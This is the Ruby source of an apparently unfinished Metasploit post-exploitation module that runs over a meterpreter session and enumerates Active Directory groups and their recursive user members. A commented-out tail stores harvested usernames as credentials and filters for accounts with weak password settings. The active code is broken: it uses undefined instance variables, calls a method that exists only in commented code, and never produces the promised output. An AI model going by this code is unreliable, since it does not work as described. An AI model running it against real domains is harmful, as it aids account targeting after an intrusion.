##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex'
require 'msf/core'

class Metasploit3 < Msf::Post
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::LDAP
  include Msf::Post::Windows::Accounts

  def initialize(info = {})
    super(update_info(
      info,
      'Name'         => 'AD Group & User Membership to Offline SQL Database',
      'Description'  => %{
        This module will gather a list of AD groups, identify the users (taking into account recursion)
        and optionally write this to a greppable file, a SQLite database or a mysql-compatible SQL file
        for offline analysis.
      },
      'License'      => MSF_LICENSE,
      'Author'       => [
        'Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>'
      ],
      'Platform'     => [ 'win' ],
      'SessionTypes' => [ 'meterpreter' ]
    ))
  end

  def run
    max_search = 0

    # Download the list of groups from Active Directory
    vprint_status "Retrieving AD Groups"
    begin
      group_fields = ['distinguishedName','objectSid','samAccountType','sAMAccountName','whenChanged','whenCreated','description']
      groups = query(query_filter, max_search, @group_fields)
    rescue ::RuntimeError, ::Rex::Post::Meterpreter::RequestError => e
      print_error("Error(Group): #{e.message.to_s}")
      return
    end

    # If no groups were downloaded, there's no point carrying on
    if groups.nil? || groups[:results].empty?
      print_error('No AD groups were discovered')
      return
    end

    # Go through each of the groups and identify the individual users in each group
    vprint_status "Retrieving AD Group Membership"
    users_fields = ['distinguishedName','objectSid','sAMAccountType','sAMAccountName','displayName','title','description','logonCount','userAccountControl','userPrincipalName','whenChanged','whenCreated']
    groups[:results].each do |individual_group|
      begin
        # Perform the ADSI query to retrieve the effective users in each group
        vprint_status "Retrieving members of #{individual_group[3].to_s}"
        users_filter = "(&(objectCategory=person)(objectClass=user)(memberof:1.2.840.113556.1.4.1941:=#{individual_group[0].to_s}))"
        users_in_group = query(users_filter, max_search, @users_fields)
        next if users_in_group.nil? || users_in_group[:results].empty?
    
      rescue ::RuntimeError, ::Rex::Post::Meterpreter::RequestError => e
        print_error("Error(Users): #{e.message.to_s}")
        return
      end
    end

  end
end 

#    @user_fields = USER_FIELDS.dup
#
#    if datastore['ADDITIONAL_FIELDS']
#      additional_fields = datastore['ADDITIONAL_FIELDS'].gsub(/\s+/, "").split(',')
#      @user_fields.push(*additional_fields)
#    end
#
#    max_search = datastore['MAX_SEARCH']
#
#    begin
#      q = query(query_filter, max_search, @user_fields)
#    rescue ::RuntimeError, ::Rex::Post::Meterpreter::RequestError => e
#      # Can't bind or in a network w/ limited accounts
#      print_error(e.message)
#      return
#    end
#
#    if q.nil? || q[:results].empty?
#      print_status('No results returned.')
#    else
#      results_table = parse_results(q[:results])
#      print_line results_table.to_s
#
#      if datastore['STORE_LOOT']
#        stored_path = store_loot('ad.users', 'text/plain', session, results_table.to_csv)
#        print_status("Results saved to: #{stored_path}")
#      end
#    end
#  end
#
#  def account_disabled?(uac)
#    (uac & UAC_DISABLED) > 0
#  end
#
#  def account_locked?(lockout_time)
#    lockout_time > 0
#  end
#
#  # Takes the results of LDAP query, parses them into a table
#  # and records and usernames as {Metasploit::Credential::Core}s in
#  # the database.
#  #
#  # @param [Array<Array<Hash>>] the LDAP query results to parse
#  # @return [Rex::Ui::Text::Table] the table containing all the result data
#  def parse_results(results)
#    domain = datastore['DOMAIN'] || get_domain
#    domain_ip = client.net.resolve.resolve_host(domain)[:ip]
#    # Results table holds raw string data
#    results_table = Rex::Ui::Text::Table.new(
#      'Header'     => "Domain Users",
#      'Indent'     => 1,
#      'SortIndex'  => -1,
#      'Columns'    => @user_fields
#    )
#
#    results.each do |result|
#      row = []
#
#      result.each do |field|
#        if field.nil?
#          row << ""
#        else
#          row << field[:value]
#        end
#      end
#
#      username = result[@user_fields.index('sAMAccountName')][:value]
#      uac = result[@user_fields.index('userAccountControl')][:value]
#      lockout_time = result[@user_fields.index('lockoutTime')][:value]
#      store_username(username, uac, lockout_time, domain, domain_ip)
#
#      results_table << row
#    end
#    results_table
#  end
#
#  # Builds the LDAP query 'filter' used to find our User Accounts based on
#  # criteria set by user in the Datastore.
#  #
#  # @return [String] the LDAP query string
#  def query_filter
#    inner_filter = '(objectCategory=person)(objectClass=user)'
#    inner_filter << '(!(lockoutTime>=1))' if datastore['EXCLUDE_LOCKED']
#    inner_filter << '(!(userAccountControl:1.2.840.113556.1.4.803:=2))' if datastore['EXCLUDE_DISABLED']
#    inner_filter << "(memberof:1.2.840.113556.1.4.1941:=#{datastore['GROUP_MEMBER']})" if datastore['GROUP_MEMBER']
#    inner_filter << "(#{datastore['FILTER']})" if datastore['FILTER']
#    case datastore['UAC']
#      when 'ANY'
#      when 'NO_PASSWORD'
#        inner_filter << '(userAccountControl:1.2.840.113556.1.4.803:=32)'
#      when 'CHANGE_PASSWORD'
#        inner_filter << '(!sAMAccountType=805306370)(pwdlastset=0)'
#      when 'NEVER_EXPIRES'
#        inner_filter << '(userAccountControl:1.2.840.113556.1.4.803:=65536)'
#      when 'SMARTCARD_REQUIRED'
#        inner_filter << '(userAccountControl:1.2.840.113556.1.4.803:=262144)'
#      when 'NEVER_LOGGEDON'
#        inner_filter << '(|(lastlogon=0)(!lastlogon=*))'
#    end
#    "(&#{inner_filter})"
#  end
#
#  def store_username(username, uac, lockout_time, realm, domain_ip)
#    service_data = {
#      address: domain_ip,
#      port: 445,
#      service_name: 'smb',
#      protocol: 'tcp',
#      workspace_id: myworkspace_id
#    }
#
#    credential_data = {
#      origin_type: :session,
#      session_id: session_db_id,
#      post_reference_name: refname,
#      username: username,
#      realm_value: realm,
#      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN
#    }
#
#    credential_data.merge!(service_data)
#
#    # Create the Metasploit::Credential::Core object
#    credential_core = create_credential(credential_data)
#
#    if account_disabled?(uac.to_i)
#      status = Metasploit::Model::Login::Status::DISABLED
#    elsif account_locked?(lockout_time.to_i)
#      status = Metasploit::Model::Login::Status::LOCKED_OUT
#    else
#      status = Metasploit::Model::Login::Status::UNTRIED
#    end
#
#    # Assemble the options hash for creating the Metasploit::Credential::Login object
#    login_data = {
#      core: credential_core,
#      status: status
#    }
#
#    login_data[:last_attempted_at] = DateTime.now unless (status == Metasploit::Model::Login::Status::UNTRIED)
#
#    # Merge in the service data and create our Login
#    login_data.merge!(service_data)
#    create_credential_login(login_data)
#  end
#end
